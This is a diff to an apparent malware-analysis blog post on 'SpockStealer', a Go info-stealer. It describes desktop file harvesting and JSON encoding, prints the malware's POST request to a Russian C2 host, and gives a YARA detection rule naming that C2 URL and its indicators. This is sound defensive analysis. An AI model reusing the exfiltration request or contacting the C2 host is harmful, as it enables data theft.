@@ -1,5 +1,5 @@
 ---
-title:  "SpockStealer: Technical analysis of a Golang-based info stealer."
+title:  "SpockStealer: Technical analysis of a Golang-based info-stealer."
 layout: post
 categories: malware-analysis
 ---
@@ -14,7 +14,6 @@ categories: malware-analysis
     - Analysis of the stealer using IDA-Freeware.
     - Features of the malware.
     - Open Source packages used.
-- Infrastructure Analysis.
 - YARA Rule.
 - MITRE ATT&CK.
 - Summary.
@@ -172,13 +171,99 @@ Now, let us move ahead to the next function.
 
 ![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/9763fdb1-460e-4c9a-afcf-c24b8a83c11c)
 
+![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/01919427-078a-4197-90c1-ad78d1154b4d)
+
+This function reads the hardcoded path `C:\Users\%s\Desktop` which it uses as an argument for the function `ReadDir` which reads the files in the directory and then uses a slice object to store the data and returns from the function. 
+
+
+![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/9fcdc099-5035-45aa-8e44-58e668a860c9)
+
+
+Now, once all the data is harvested it goes ahead encoding the data in a JSON format using the [Marshal](https://gobyexample.com/json) function, which converts all the data in a JSON format for exfiltration to the external C2 Server. 
+
+
+Now, once we are done with the feature-focused functions let us look into the exfiltration part. 
+
+
+![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/d1e99a12-c2d5-4676-9e22-35ab0387db2c)
+
+![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/aae823a4-6654-4b8b-bdee-6e0bc880e62d)
+
+Upon scrolling, we can see that the binary is sending a `POST` request to a URL, which is supposedly the external C2 host responsible for storing the exfiltrated data, and the content type is `JSON`, where in layman's terms it is sending the JSON encoded content to C2. The data from the request looks something like this.
+
+```
+POST /topgamer HTTP/1.1
+Host: mail.azlmut.ru
+User-Agent: Go-http-client/1.1
+Content-Length: XXXXXX
+Content-Type: application/json
+Accept-Encoding: gzip
+
+```
+
+Upon a little bit of OSINT, it turns out that the domain has been recently registered based out of Russia. 
 
 
 
+## Features of the malware
+
+- Host Enumeration.
+- User & Group Enumeration.
+- Screenshot Grabber.
+- Process Enumeration.
+- Environment Variable enumeration.
 
 
+## Open Source packages used
+
+Well, generally, a Go binary uses a lot of generic open-source packages irrespective of the intent like OS, Net and many more, no matter whether it is malicious or not. So, I will mention the open-source packages which are uncommon and have been used by this generic stealer.
+
+- [gopsutil](https://github.com/shirou/gopsutil).
+- [screenshot](https://github.com/kbinani/screenshot).
 
 
+## YARA Rule
+
+I am not very good at writing YARA Signatures, so if you find that the signature is faulty and causes FNs feel free to let me know.
+
+```
+rule spocksteal {
+    meta:
+        author = "Elemental X"
+        description = "YARA rule for detecting malicious spock stealer binary"
+        hash = "89300678df750de360222d0cefbebb4291f30c5aec86c2cdaab32b0f09891e94"
+        date = "2024-02-26"
+
+    strings:
+        $opcode_sequence = { 48 8B 6D 00 48 8D 44 24 78 E8 [4] 48 8D 44 24 78 E8 [4] 48 8D 44 24 78 E8 [4] 48 8D 44 24 78 E8 [4] 48 8D 44 24 78 E8 [4] 90 }
+        $string1 = "github.com/kbinani/screenshot"
+        $string2 = "github.com/shirou/gopsutil/"
+        $string3 = "spock-go-main/"
+        $url_string = "https://mail.azlmut.ru/topgamerjson"
+
+    condition:
+        $opcode_sequence and ($string1 or $string2 or $string3 or $url_string)
+}
+```
+
+This rule is very much specific to the binary and will detect the samples released by this build in the wild. Upon better telemetry, the rule shall  be tweaked. 
 
 
+## MITRE ATT&CK
 
+- Discovery: Remote System Discovery[T1018]
+- Collection: Screen Capture[T1113]
+- Discovery: Process Discovery[T1057]
+- Discovery: File and Directory Discovery[T1083]
+- Command and Control: Web Service[T1102]
+
+
+## Summary
+
+This is a very generic stealer, which uses Golang and presumably is in the development stage, where the developer is supposed to add more features as the path from the binary clearly says that it is part of a stealer project. 
+
+
+## Resources
+
+- Golang Official Documentation.
+- MITRE ATT&CK Framework.
